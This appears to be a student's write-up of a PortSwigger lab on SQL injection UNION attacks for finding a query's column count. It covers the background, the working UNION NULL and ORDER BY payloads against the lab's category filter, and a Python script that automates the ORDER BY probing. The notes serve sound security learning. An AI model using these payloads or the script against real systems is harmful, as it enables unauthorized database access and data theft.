---
category:
  - Portswigger_Labs
tags:
  - portswigger
  - labs
  - sqli
  - sql_injection
published: false
date: 2025-05-31T14:03:00
excalidraw-plugin: parsed
excalidraw-open-md: true
---
## Lab: [SQL injection UNION attack, determining the number of columns returned by the query](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-determining-the-number-of-columns-required/sql-injection/union-attacks/lab-determine-number-of-columns)

> This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.
	To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values.

*This lab teaches how to find the number of columns a table has....*

---
### Background for UNION
Products Table

| Product | Company |
| ------- | ------- |
| IPhone  | Apple   |
| UPhone  | Banana  |
Users Table:

| User   | Password        |
| ------ | --------------- |
| suhesh | $ecurePwd123    |
| samir  | P@ssw0rdCompl3x |
Query #1: `SELECT product,price from products`
IPhone,Apple
UPhone,Banana

Query #2: `SELECT product,price from products UNION SELECT user,password from users`
IPhone,Apple
UPhone,Banana
suhesh,$ecurePwd123
samir,P@ssw0rdCompl3x
## SQL UNION Rules:
- The number and order of the column must be same in all queries
	- `SELECT product,price from products UNION SELECT user,password from users` -> VALID
	- `SELECT product,price from products UNION SELECT first_name, last_name,password from users` -> INVALID
- All datatypes must be compatible
	- In above example everything is type string.
## Attack theory:
#### UNION
1. `select ? from table1 UNION select NULL`
	- Error incorrect number of columns
2. `select ? from table1 UNION select NULL, NULL`
	- Error incorrect number of columns
3. `select ? from table1 UNION select NULL, NULL, NULL`
	- 200 Reponse code -> correct number of columns
#### ORDER BY
1. `select a,b from table1 ORDERBY 1`
	- The output is ordered by first column
2. `select a,b from table1 ORDERBY 2`
	- The output is ordered by second column
3. `select a,b from table1 ORDERBY 3`
	- Error column 3 does not exist -> found out third column doesn't exist 
### Finding if vulnerability exists
Using the SQLi `category='` in filter results in **Internal Server Error**. 
### Attacking
- **Using UNION:**
	Using upto two NULL values, the query gives Internal Server Error.
	**Used payload->**  `/filter?category=Pets'+UNION+SELECT+NULL,+NULL,+NULL--`  
- **Using ORDERBY:**
	Using ORDER BY 1, does nothing to column one is probably SN
	Using ORDER BY 2, sorts the products in alphabetical order
	Using ORDER BY 3, sorts the price in ascending order
	Using ORDER BY 4, gives error. Most certainly because the table has only three columns
	**Used payload->**  `/filter?category=Gifts' ORDER BY 4--`

---
# Pythonizing for Automating 
```python
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'} 
  
def order_by_attack(url):
    path = "filter?category=Gifts"
    for i in range(1,50):
        payload=f"' ORDER BY {i}--"
        r=requests.get(url+path+payload, verify=False, proxies=proxies)
        if "Internal Server Error" in r.text:
            return i-1
        i=i+1
    return False
 
if __name__=="__main__":
    try:
        url = sys.argv[1].strip()         
    except IndexError:
        print(f"[ - ] Usage: {sys.argv[0]} <URL>")
        sys.exit(-1)
         
    col_num=order_by_attack(url)
    if col_num:
        print(f"The number of column is: {col_num}")
    else:
        print("Unsuccessful")
```



%%
# Excalidraw Data
## Text Elements
%%
## Drawing
```compressed-json
N4KAkARALgngDgUwgLgAQQQDwMYEMA2AlgCYBOuA7hADTgQBuCpAzoQPYB2KqATLZMzYBXUtiRoIACyhQ4zZAHoFAc0JRJQgEYA6bGwC2CgF7N6hbEcK4OCtptbErHALRY8RMpWdx8Q1TdIEfARcZgRmBShcZQUebTiADho6IIR9BA4oZm4AbXAwUDAiiBJuCAAxAEYeAFEAGSEAaQAlTShiAC0ASQBrAHkAYQoARyFiADZkoshYRDKAM0CETyp+

YsxuHgB2AGZtLYBWNcgYbmcdhK3jiAoSdW4ABm0Hl8rryQRCZWlH59fr6zKYKPa7MKCkNg9BADNj4NikMoAYkqCBRKKmxU0uGwPWUEKEHGIMLhCIk4OszDguECmQxkHmhHw+AAyrBgRJBB46RAwRCoQB1O6STag8GQhCsmDs9Cc0rXfHfDjhbJoN75SBsKnYNSnVUva544RwLrEFWoHIAXWui1w6RN3A4QiZ10IhKwZVwD25+MJSuYZsdzvVPIQy

24lUOCQALJUdgdKuNrowWOwuGgjsHk6xOAA5ThiTZRqM7ACcWwjfGDhGYABFUlAw2hwUIENdNMJCTVgulMgGnfhrkI4MRcA3iOGtjxYwl41txlGHmrphAiBweg7+9c4TjG6h5gQwtc4GxXVlcuqwHlpkUHscbxerRer9eni9F3ewK/Xg/1Y/l3BAn9ERwlyP9ilYfQnVHBAAAVAOYYDuGbVtg3wUIoBhfR9DUMcYJPWk0GfG8/nfC8v0XX98gAXz

WQpilKCQhB4DpnAAQXGYZWNwHgowAITEGBmQACQADWcGoAH1uVmcR0EWUMVm5DY0C2BJxn2DNl11VBnCjA4EmuW5iHuNByKXYoPi+H5TJI8zIEBaVb2DXlxWJeEkTRVEkDbbFcR9IlYXcslyA4SlqQyKBuQZJlJWlHlYTlZyxQFIURSSvkJTZWT4q5eVhEVZVw2uTVsR1cN9WDQ0hxNM1LWtcg7XHNBAwHKs3WU9BcEqb0O2IP0+yDZcwl3HgHhL

KNxhLA4Sx4pMmGzNNUE04os1TPMOALNAdkqB4EkqGddpdWt613ZC216rs0gigbWuXIcRzHCcpwueMEh2csdi3V112azdULYHcmr3A8UP/fCz0Ip8L0/D8HgfO8iOIt87KR79rwtX8j3g4DarAgRCEgtCGzg5VEKbUgWy3dDMOwmRljw09zxfWy7zMyiiio8A/wgXA4DgVloO4OjoA+dIyiIb5IrWBhCAQCheN8qrCTc0l0EReYNc1jEIGwEQaSgL

oG30VkMpVjyvPRaXddIfXDbSBWcSVgKSTKclQqpfXtet22jfKRkWSyspZXHK29Yiu3jeShBBWM4U0ErYpvfDo2TfFWLsuDr2w8yCPmnyyR+qK/Idezg2jb6LUyr1JzE9LiPyk4KByltRltPMkubeTtIG8yZlCCMWTRtDzuc6NgAVLAoFYiXFpXBB5il4uk9HtIBdIKebbYCgPlwIGWuHn20hqQlWM37eQiBnmz+15hsAhJkRO4VT1MOaXb/v/AAE

1uAmgzi6MNgBghaZgIC2cM1ED5d30HnAkfVCoSH8trPEJA+4Dw3INSAyDnZBVQHRSAvFYSX0RAMEsJCSHlHKNyZoCBlBQVVhARENQaxMKYRQiAECl6l1TlCCuUBUw3WlgBBAZhhDMAAOKkBQf3WS+9i42nSNQt0kiODKGAcuDIuBNDBCBmdYM2AiBwCQhTUGxQOC2lkro5cwgoCrgscYjhxQ7AACsEDYCyMyMxcAACybBiAIGPpo7R3B9z4DCOAG

idBoogTQMATmVEgA
```
%%